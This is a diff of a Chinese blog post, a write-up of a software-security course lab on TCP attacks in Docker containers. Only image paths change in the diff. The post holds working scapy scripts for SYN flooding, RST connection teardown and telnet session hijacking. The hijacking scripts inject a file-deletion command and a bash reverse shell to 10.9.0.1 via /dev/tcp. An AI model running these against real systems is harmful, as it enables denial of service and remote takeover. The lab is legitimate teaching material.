@@ -22,35 +22,35 @@
 <meta property="og:site_name" content="welc0me">
 <meta property="og:description" content="《软件安全》课程实验5，tcp相关实验，主要是协议缺陷导致的劫持session，dos攻击">
 <meta property="og:locale">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510191543262.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220524133430797.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510193001078.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510193313724.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510193241984.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510194156685.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510195209338.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510205127980.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510200517448.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510200612615.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510200852973.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510201734224.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510202222470.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510202455670.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510203209647.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220511092929276.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510223755263.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220510223649384.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220511093716786.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220511132408750.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220512162650847.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220511135528505.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510191543262.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220524133430797.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510193001078.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510193313724.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510193241984.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510194156685.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510195209338.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510205127980.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510200517448.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510200612615.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510200852973.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510201734224.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510202222470.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510202455670.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510203209647.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220511092929276.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510223755263.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510223649384.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220511093716786.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220511132408750.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220512162650847.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220511135528505.png">
 <meta property="article:published_time" content="2022-05-18T00:27:47.000Z">
 <meta property="article:modified_time" content="2023-01-19T05:04:56.000Z">
 <meta property="article:author" content="nich0las">
 <meta property="article:tag" content="software-security">
 <meta property="article:tag" content="tcp">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220510191543262.png">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/2022/05/18/software-security-lab5/image-20220510191543262.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -329,10 +329,10 @@
 <span id="more"></span>
 
 <h1 id="TCP-lab"><a href="#TCP-lab" class="headerlink" title="TCP lab"></a>TCP lab</h1><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><p>首先看一下系统的队列长度。一般而言，系统的内存越大，队列越大。这里的队列是指TCP连接的等待队列。</p>
-<p><img src="/.io//image-20220510191543262.png" alt="image-20220510191543262"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510191543262.png" alt="image-20220510191543262"></p>
 <p>除此以外，可以用以上<code>netstat</code>命令查看队列的用处。</p>
 <h3 id="syn-cookie"><a href="#syn-cookie" class="headerlink" title="syn cookie"></a>syn cookie</h3><p>一般而言,syn cookie的保护在ubuntu中是默认开启的。SYN_COOKIE使得服务器在收到每个连接时，检查一下是否和之前的连接信息匹配。具体而言，如下所示。</p>
-<p><img src="/.io//image-20220524133430797.png" alt="image-20220524133430797"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220524133430797.png" alt="image-20220524133430797"></p>
 <blockquote>
 <p>SYN cookie</p>
 <p>使用一个公式生成SNs。从而在第三步检验是否是伪造的SNS</p>
@@ -342,22 +342,22 @@
 <p>由于端口、IP地址等，都是不会被存放的，直接把包中的提取出来即可。因此不需要资源保存。最关键的就是Mac的key。保证了验证安全性</p>
 </blockquote>
 <h3 id="launch-attack"><a href="#launch-attack" class="headerlink" title="launch attack"></a>launch attack</h3><p>在docker里面运行这个python脚本。这里的IP写的是受害者IP，端口号写的是23，也就是telnet端口号。</p>
-<p><img src="/.io//image-20220510193001078.png" alt="image-20220510193001078"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510193001078.png" alt="image-20220510193001078"></p>
 <p>但是后来发现，我们还是可以成功连接。</p>
-<p><img src="/.io//image-20220510193313724.png" alt="image-20220510193313724"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510193313724.png" alt="image-20220510193313724"></p>
 <p>在docker里面查看连接队列状况，如下所示。可以看到出现了很多<code>SYN_RECV</code>等待的状态，这说明有很多连接确实是属于半开放状态，证实了我们的tcp连接攻击起到了一定的效果，但并没有成功的拒绝服务。</p>
-<p><img src="/.io//image-20220510193241984.png" alt="image-20220510193241984"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510193241984.png" alt="image-20220510193241984"></p>
 <p>在pdf中，作者给出了一些可能的原因。</p>
 <ol>
 <li><p>tcp cache: <strong>tcp会为已经连接过这个主机的一些IP做一个cache。容量大概在整个queue的1/4左右</strong>。因此在我们已经连结果victim的情况下，可能victim的docker记住过我们的IP，为我们下一次telnet登录预留了空间。(我之前确实登陆过)</p>
 </li>
 <li><p>tcp 重传机制。在等待ACK包的时候，如果超过了一定时间，TCP就会重传SYN+ACK的包。可以利用<code>sysctl net.ipv4.tcp_synack_retries</code>查看需要重传几次包。例如我电脑上的victim中，数值为5.</p>
-<p><img src="/.io//image-20220510194156685.png" alt="image-20220510194156685"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510194156685.png" alt="image-20220510194156685"></p>
 </li>
 </ol>
 <p>​        这说明当我们重传SYN+ACK的包五次之后，如果还没有收到回应，系统就会删除这个连接。再加上python脚本速度不够。在本次尝试中，我是用的是单线程python脚本进行tcp flooding。因此可以尝试多线程或者多开几个实例。下面是改进的攻击。</p>
 <h3 id="改进攻击"><a href="#改进攻击" class="headerlink" title="改进攻击"></a>改进攻击</h3><p>首先，刷新victm为我们保留的登陆记录。</p>
-<p><img src="/.io//image-20220510195209338.png" alt="image-20220510195209338"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510195209338.png" alt="image-20220510195209338"></p>
 <p>接着，调整我们的脚本为多线程。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP,TCP,send</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">ip = IP(dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(dport=<span class="number">23</span>,flags=<span class="string">&#x27;S&#x27;</span>) <span class="comment"># the port of telnet</span></span><br><span class="line">pkt=ip/tcp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pkt[IP].src = <span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>)))</span><br><span class="line">        pkt[TCP].sport = getrandbits(<span class="number">16</span>)</span><br><span class="line">        pkt[TCP].seq = getrandbits(<span class="number">32</span>)</span><br><span class="line">        send(pkt,verbose = <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        t = threading.Thread(target = attack)</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure>
 
@@ -365,32 +365,32 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=80</span><br></pre></td></tr></table></figure>
 
 <p>之后便可以发现攻击成功，我们无法用telnet连接上服务器，一直在显示trying，最终timeout了。</p>
-<p><img src="/.io//image-20220510205127980.png" alt="image-20220510205127980"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510205127980.png" alt="image-20220510205127980"></p>
 <p>回到我们victim的docker里面，发现连接队列几乎被占满。</p>
-<p><img src="/.io//image-20220510200517448.png" alt="image-20220510200517448"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510200517448.png" alt="image-20220510200517448"></p>
 <p>查看一下连接队列的属性，发现全都被随机的IP和端口号填充满了。</p>
-<p><img src="/.io//image-20220510200612615.png" alt="image-20220510200612615"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510200612615.png" alt="image-20220510200612615"></p>
 <p>所以当我们刷新了连接buffer，修改python为多线程，调整系统的tcp连接队列大小之后，我们确实无法链接到此IP。</p>
 <p>经过测试，当能够接受的连接最大数量为128时，需要python 11个以上的线程同时运行才能完成一次攻击。因此，在下面的例子中我们使用c语言编写的程序，速度会大大加快。</p>
 <h2 id="task-1-2"><a href="#task-1-2" class="headerlink" title="task 1.2"></a>task 1.2</h2><p>第二个task，我们用C实现的tcp flooding脚本尝试完成此攻击。我们首先把queue恢复到原来的大小</p>
-<p><img src="/.io//image-20220510200852973.png" alt="image-20220510200852973"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510200852973.png" alt="image-20220510200852973"></p>
 <p>接着使用以下命令编译并执行此文件。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o synflood synflood.c</span><br><span class="line">./synflood 10.9.0.5 23</span><br></pre></td></tr></table></figure>
 
 <p>未开多线程时，python脚本执行效果如下所示。可以看到队列中时常会出现小于128的滞留序列。</p>
-<p><img src="/.io//image-20220510201734224.png" alt="image-20220510201734224"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510201734224.png" alt="image-20220510201734224"></p>
 <p>使用C生成的可执行文件结果如下所示。可以看到，几乎没有出现过小于128的数值。</p>
-<p><img src="/.io//image-20220510202222470.png" alt="image-20220510202222470"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510202222470.png" alt="image-20220510202222470"></p>
 <p>这是因为c作为一种编译性语言，和解释型语言(python)相比，速度会有明显的上升。</p>
 <h2 id="Enable-cookie"><a href="#Enable-cookie" class="headerlink" title="Enable cookie"></a>Enable cookie</h2><p>这里我们重新把队列大小调整回去，并且设置syncookies为1。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_syncookies=1</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20220510202455670.png" alt="image-20220510202455670"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510202455670.png" alt="image-20220510202455670"></p>
 <p>接着将队列长度同样的设置小</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=80</span><br></pre></td></tr></table></figure>
 
 <p>发现我们攻击基本上都失败了</p>
-<p><img src="/.io//image-20220510203209647.png" alt="image-20220510203209647"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510203209647.png" alt="image-20220510203209647"></p>
 <blockquote>
 <p>成功原因: tcp cookie采用的方案是<strong>当连接超过一定数目时，不保存tcp连接的中间结果</strong>，也就是说不为syn开辟内存。并且是用一种hash技术，发送SYN ACK中将包含远IP和端口的mac。这样也能够防止攻击者伪造ACK包。</p>
 </blockquote>
@@ -401,19 +401,19 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark ./pkt2.pcap</span><br></pre></td></tr></table></figure>
 
 <p>可以看到下面的内容。我们观察到下图，发现telnet实际上next seq始终是本次seq+1.因此</p>
-<p><img src="/.io//image-20220511092929276.png" alt="image-20220511092929276"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220511092929276.png" alt="image-20220511092929276"></p>
 <p>首先我们需要把网卡的混杂模式打开</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link set br-9b3a554cecec promisc on</span><br></pre></td></tr></table></figure>
 
 <p>注意这里网卡的名称，需要用ifconfig看到。如下图。看到第一个网卡所在的就是两个user的子网，因此我们就把这个网卡设置为混杂模式。</p>
-<p><img src="/.io//image-20220510223755263.png" alt="image-20220510223755263"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510223755263.png" alt="image-20220510223755263"></p>
 <p>使用以下命令可以完成包劫持的工作</p>
-<p><img src="/.io//image-20220510223649384.png" alt="image-20220510223649384"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220510223649384.png" alt="image-20220510223649384"></p>
 <p>接下来就可以编写简单的脚本，并过滤出攻击的目标端口、源端口、目标IP，源IP即可。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_attack</span>(<span class="params">src_ip,dst_ip,src_port,dst_port,next_seq</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    execute attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    ip = IP(src=<span class="built_in">str</span>(src_ip),dst=<span class="built_in">str</span>(dst_ip))</span><br><span class="line">    tcp = TCP(sport = <span class="built_in">int</span>(src_port), dport = <span class="built_in">int</span>(dst_port),flags=<span class="string">&quot;R&quot;</span>,seq = next_seq) <span class="comment"># reset packge</span></span><br><span class="line">    pkt = ip/tcp</span><br><span class="line">    ls(pkt)</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_package</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;received arguments: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src ip: &quot;</span> + <span class="built_in">str</span>(x[IP].src))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst ip: &quot;</span> + <span class="built_in">str</span>(x[IP].dst))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src port: &quot;</span> + <span class="built_in">str</span>(x[IP].sport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst port: &quot;</span> + <span class="built_in">str</span>(x[IP].dport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp seq: &quot;</span> + <span class="built_in">str</span>(x[TCP].seq))</span><br><span class="line">    <span class="comment"># proceed these values and send it to exec_attack</span></span><br><span class="line">    exec_attack(x[IP].src,x[IP].dst,x[IP].sport,x[IP].dport,x[TCP].seq+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sniff</span>():</span><br><span class="line">    sniff(<span class="built_in">filter</span>=<span class="string">&quot;dst 10.9.0.6 and tcp&quot;</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>,prn=<span class="keyword">lambda</span> x:print_package(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sniff()</span><br></pre></td></tr></table></figure>
 
 <p>从下面的截图中可以看到，当用户尝试输入用户名时，连接就被中断。(注意，我这里并没有输入ctrl+c, 如果输入会在用户名界面上直接显示出来)原理是当我们输入用户名时，本质上还是往服务器发送了一个报文，这个报文在经过scapy的时候被截获，scapy进而立刻发送一个带有RST字段的包给目的主机，从而使目的主机认为连接需要关闭，因此结束了本次连接。</p>
-<p><img src="/.io//image-20220511093716786.png" alt="image-20220511093716786"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220511093716786.png" alt="image-20220511093716786"></p>
 <h2 id="task3-TCP-Session-Hijacking"><a href="#task3-TCP-Session-Hijacking" class="headerlink" title="task3 TCP Session Hijacking"></a>task3 TCP Session Hijacking</h2><p>上面一个例子中，我们通过受害者发送包的同时发送一个RST包，从而使连接中断，下面的实验中我们还能做到任意代码执行。</p>
 <p>这里由于我们还需要一个tcp的ack号码，因此也需要截获包中的tcp编号。使用脚本可以很方便的达到这一点。</p>
 <p>和上一个脚本的不同之处在于，这次我们在data部分写上了我们要执行的命令，然后在伪造的tcp部分写上了ack编号，这个ack编号我这里是直接用的截获的发出去的包的ack，可能是scapy接获之后发送的包将会先到达目标服务器的缘故，这样做是可以成功的。</p>
@@ -424,7 +424,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_attack</span>(<span class="params">src_ip,dst_ip,src_port,dst_port,next_seq,ack_num</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    execute attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    ip = IP(src=<span class="built_in">str</span>(src_ip),dst=<span class="built_in">str</span>(dst_ip))</span><br><span class="line">    tcp = TCP(sport = <span class="built_in">int</span>(src_port), dport = <span class="built_in">int</span>(dst_port),flags=<span class="string">&quot;A&quot;</span>,seq = next_seq,ack = ack_num) <span class="comment"># reset packge</span></span><br><span class="line">    data = <span class="string">&quot;\rrm -f /home/seed/secret.txt\r&quot;</span></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    ls(pkt)</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_package</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;received arguments: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src ip: &quot;</span> + <span class="built_in">str</span>(x[IP].src))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst ip: &quot;</span> + <span class="built_in">str</span>(x[IP].dst))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src port: &quot;</span> + <span class="built_in">str</span>(x[IP].sport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst port: &quot;</span> + <span class="built_in">str</span>(x[IP].dport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp seq: &quot;</span> + <span class="built_in">str</span>(x[TCP].seq))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp ack: &quot;</span> + <span class="built_in">str</span>(x[TCP].ack))</span><br><span class="line">    <span class="comment"># proceed these values and send it to exec_attack</span></span><br><span class="line">    exec_attack(x[IP].src,x[IP].dst,x[IP].sport,x[IP].dport,x[TCP].seq+<span class="number">1</span>,x[TCP].ack)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sniff</span>():</span><br><span class="line">    sniff(<span class="built_in">filter</span>=<span class="string">&quot;dst 10.9.0.6 and tcp&quot;</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>,prn=<span class="keyword">lambda</span> x:print_package(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sniff()</span><br></pre></td></tr></table></figure>
 
 <p>成功截图如下所示。从左上角的终端可以看到，可以看到服务器的一个秘密文件已经被删除。右半边的终端中，显示了我们构造包的命令，是<code>rm -f /home/seed/secret.txt</code>。</p>
-<p><img src="/.io//image-20220511132408750.png" alt="image-20220511132408750"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220511132408750.png" alt="image-20220511132408750"></p>
 <blockquote>
 <p>注意，这里发现一旦攻击者发送删除文件命令之后，<strong>用户就无法再向服务器终端输入内容</strong>了，这是因为由于我们攻击时，<strong>发送了一个随机的序列号，服务器收到时，就会认为原先没有收到的这部分序列号出现了丢包，因此会要求用户重发</strong>。但是<strong>用户显然没有发送过这个数据包，因此会认为这个包无效</strong>，<strong>但是服务器还会一直重发</strong>，这就导致了用户终端卡死了。</p>
 </blockquote>
@@ -433,9 +433,9 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_attack</span>(<span class="params">src_ip,dst_ip,src_port,dst_port,next_seq,ack_num</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    execute attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    ip = IP(src=<span class="built_in">str</span>(src_ip),dst=<span class="built_in">str</span>(dst_ip))</span><br><span class="line">    tcp = TCP(sport = <span class="built_in">int</span>(src_port), dport = <span class="built_in">int</span>(dst_port),flags=<span class="string">&quot;A&quot;</span>,seq = next_seq,ack = ack_num) <span class="comment"># reset packge</span></span><br><span class="line">    data = <span class="string">&quot;\r /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1 \r&quot;</span></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    ls(pkt)</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_package</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;received arguments: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src ip: &quot;</span> + <span class="built_in">str</span>(x[IP].src))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst ip: &quot;</span> + <span class="built_in">str</span>(x[IP].dst))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src port: &quot;</span> + <span class="built_in">str</span>(x[IP].sport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst port: &quot;</span> + <span class="built_in">str</span>(x[IP].dport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp seq: &quot;</span> + <span class="built_in">str</span>(x[TCP].seq))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp ack: &quot;</span> + <span class="built_in">str</span>(x[TCP].ack))</span><br><span class="line">    <span class="comment"># proceed these values and send it to exec_attack</span></span><br><span class="line">    exec_attack(x[IP].src,x[IP].dst,x[IP].sport,x[IP].dport,x[TCP].seq+<span class="number">1</span>,x[TCP].ack)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sniff</span>():</span><br><span class="line">    sniff(<span class="built_in">filter</span>=<span class="string">&quot;dst 10.9.0.6 and tcp&quot;</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>,count=<span class="number">1</span>,prn=<span class="keyword">lambda</span> x:print_package(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sniff()</span><br></pre></td></tr></table></figure>
 
 <p>其实最重要的修改就是data部分的命令，换成了打开远程反向shell的命令。其他的和劫持会话内容没有区别。</p>
-<p><img src="/.io//image-20220512162650847.png" alt="image-20220512162650847"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220512162650847.png" alt="image-20220512162650847"></p>
 <p>在受害主机10.9.0.6中执行命令查看当前存在的连接，发现确实存在着到10.9.0.1的TCP连接，说明我们成功建立了反向shell。关于反向shell命令的含义，大致而言是把输入流和输出流都重定向到远程的主机上的某个端口，并且执行一个/bin/bash来方便交互。</p>
-<p><img src="/.io//image-20220511135528505.png" alt="image-20220511135528505"></p>
+<p><img src="/2022/05/18/software-security-lab5/image-20220511135528505.png" alt="image-20220511135528505"></p>
 <p>至此，完成了这次实验。</p>
